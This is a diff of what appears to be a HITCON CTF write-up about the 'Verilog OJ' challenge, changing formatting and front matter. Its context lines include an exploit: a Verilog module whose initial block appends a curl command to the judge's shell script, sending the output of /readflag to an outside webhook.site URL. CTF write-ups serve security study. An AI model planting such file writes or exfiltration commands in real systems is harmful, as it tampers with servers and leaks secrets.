@@ -3,7 +3,10 @@ title: Verilog OJ
 summary: Yes, we need Online Judge for Verilog for our Logic Design course.
 tags: [HitconCTF, Web, Misc, Command Injection]
 date: 2025-08-24
+showtoc: true
 ---
+
+# Verilog OJ
 
 ## Description
 
@@ -123,11 +126,11 @@ module Crossbar_2x2_4bit(in1, in2, control, out1, out2);
     input control;
     output [3:0] out1, out2;
     integer fd;
-    
+
     // mux logic for crossbar switch
     assign out1 = (control) ? in1 : in2;
     assign out2 = (control) ? in2 : in1;
-    
+
     initial begin
         fd = $fopen ("/app/scripts/judge.sh", "a+");
         $fwrite(fd, "curl https://webhook.site/07e78043-4cf9-4ad4-aaaa-fec865b06cde?`/readflag give me the flag`");
